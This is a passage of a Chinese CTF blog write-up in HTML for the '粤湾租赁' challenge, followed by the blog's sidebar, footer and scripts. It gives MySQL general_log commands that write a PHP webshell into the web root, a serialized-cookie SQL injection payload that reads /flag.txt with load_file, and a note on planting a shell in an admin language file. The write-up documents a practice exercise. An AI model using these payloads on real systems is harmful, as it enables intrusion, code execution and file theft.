+<h3 id="粤湾租赁"><a href="#粤湾租赁" class="headerlink" title="粤湾租赁"></a>粤湾租赁</h3><p>挺伤的一道题…弱密码进去之后就是巅峰极客的操作..这场比赛没了burp可真难受</p>
+<p>常规操作</p>
+<h4 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log = <span class="string">"ON"</span>;</span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/var/www/html/shell.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqli-反序列化"><a href="#sqli-反序列化" class="headerlink" title="sqli+反序列化"></a>sqli+反序列化</h4><p>cookie头中ECSCP[lastfilter]存在反序列化漏洞</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">"composite_status"</span>;s:<span class="number">86</span>:<span class="string">"1'and(extractvalue(1,concat(0x7e,substr((select load_file('/flag.txt')),1,16),0x7e)))#"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="后台语言配置处可写shell"><a href="#后台语言配置处可写shell" class="headerlink" title="后台语言配置处可写shell"></a>后台语言配置处可写shell</h4><p>admin\languages\zh_cn\common.php</p>
+<p><a href="https://imgchr.com/i/MxyhE8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/26/MxyhE8.md.png" alt="MxyhE8.md.png"></a></p>
+<p>写一个shell语句，访问common.php拿到shell</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>希望可以快速调整好状态，加油！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/20/XCTF-Final-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="next" title="XCTF Final 部分题目复现">
+                <i class="fa fa-chevron-left"></i> XCTF Final 部分题目复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="prev" title="2019D^3CTF 题目复现">
+                2019D^3CTF 题目复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#粤湾基金"><span class="nav-number">2.</span> <span class="nav-text">粤湾基金</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf"><span class="nav-number">2.1.</span> <span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传"><span class="nav-number">2.2.</span> <span class="nav-text">文件上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#粤湾投资"><span class="nav-number">3.</span> <span class="nav-text">粤湾投资</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#display后门"><span class="nav-number">3.1.</span> <span class="nav-text">display后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传-1"><span class="nav-number">3.2.</span> <span class="nav-text">文件上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#粤湾期货"><span class="nav-number">4.</span> <span class="nav-text">粤湾期货</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#重装-后台getshell-非预期"><span class="nav-number">4.1.</span> <span class="nav-text">重装+后台getshell(非预期)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie伪造-后台getshell-预期"><span class="nav-number">4.2.</span> <span class="nav-text">cookie伪造+后台getshell(预期)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#粤湾租赁"><span class="nav-number">5.</span> <span class="nav-text">粤湾租赁</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#日志getshell"><span class="nav-number">5.1.</span> <span class="nav-text">日志getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli-反序列化"><span class="nav-number">5.2.</span> <span class="nav-text">sqli+反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后台语言配置处可写shell"><span class="nav-number">5.3.</span> <span class="nav-text">后台语言配置处可写shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后记"><span class="nav-number">6.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
